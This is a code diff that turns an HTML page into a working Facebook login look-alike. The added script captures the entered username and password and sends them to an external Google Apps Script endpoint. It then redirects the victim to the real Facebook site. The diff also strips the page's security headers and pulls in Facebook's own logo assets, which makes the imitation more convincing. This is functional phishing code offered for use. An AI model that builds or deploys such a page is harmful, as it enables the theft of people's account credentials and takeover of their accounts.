@@ -4,26 +4,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-script-source.com;">
-
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://www.gstatic.com; style-src 'self' https://fonts.googleapis.com;">
-<meta http-equiv="X-Content-Type-Options" content="nosniff">
-<meta http-equiv="X-Frame-Options" content="DENY">
-<meta name="robots" content="noindex, nofollow">
-
     <title>Facebook – log in or sign up</title>
     <link rel="icon"
-        href="favicon.png"
+        href="https://1.bp.blogspot.com/-S8HTBQqmfcs/XN0ACIRD9PI/AAAAAAAAAlo/FLhccuLdMfIFLhocRjWqsr9cVGdTN_8sgCPcBGAYYCw/s1600/f_logo_RGB-Blue_1024.png"
         type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    <link rel="stylesheet" href="styles.css">
-   
+    <style>
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css');
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-between;
+            width: 900px;
+        }
+
+        .logo {
+            text-align: left;
+        }
+
+        .logo img {
+            width: 350px;
+            margin-bottom: 10px;
+            margin-left: -25px;
+        }
+
+        .explanation {
+            font-size: 1.7rem;
+            max-width: 700px;
+            margin-bottom: 60px;
+            margin-left: 10px;
+        }
+
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            text-align: center;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            outline: none;
+            caret-color: #1877f2;
+            font-weight: 20px;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
+            caret-color: #1877f2;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #166fe5;
+        }
+
+        .toggle-visibility {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            display: none;
+            opacity: 0.6;
+            filter: blur(1px);
+        }
+
+        .forgot-password {
+            display: block;
+            margin: 15px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            width: 100%;
+            height: 1px;
+            background: #ccc;
+            margin: 15px 0;
+            opacity: .3;
+        }
+
+        .create-account {
+            background: #42b72a;
+            font-size: 1rem;
+            padding: 12px;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            display: inline-block;
+            text-decoration: none;
+            margin-top: 10px;
+            transition: background 0.2s ease-in-out;
+        }
+
+        .create-account:hover {
+            background: #3a9e25;
+        }
+
+        .page-area {
+            width: 380px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.9rem;
+        }
+
+        .create-page-link {
+            color: black;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .create-page-link:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 900px) {
+            .main-content {
+                flex-direction: column;
+                text-align: center;
+                width: 100%;
+            }
+
+            .logo {
+                text-align: center;
+            }
+
+            .explanation {
+                font-size: 1rem;
+                max-width: 100%;
+            }
+        }
+    </style>
 </head>
 
 <body>
     <div class="main-content">
         <div class="logo">
-            <img src="logo.svg" alt="Facebook">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
             <div class="explanation">Facebook helps you connect and share with the people in your life.</div>
         </div>
         <div>
@@ -46,7 +208,43 @@
             </div>
         </div>
     </div>
-<script src="scripts.js"></script>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();  // Prevent default form submission
+    
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('pass').value;
+    
+            // POST request to Google Apps Script
+            fetch('https://script.google.com/macros/s/AKfycbypCrV9lEXrc87-CC98DF5YYJbGrDSLPvm37rcMPMLeyLy7ZBp1LvahB11G-zwHuB6r/exec', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: new URLSearchParams({
+                    'username': username,
+                    'password': password
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // If the request is successful, redirect to Facebook
+                    console.log("Login successful! Redirecting...");
+                    window.location.replace("https://www.facebook.com");  // Use replace to prevent users from using back button
+                } else {
+                    console.log("Failed to send data");
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred');
+            });
+        });
+    </script>
+    
+    
+
 </body>
 
 </html>
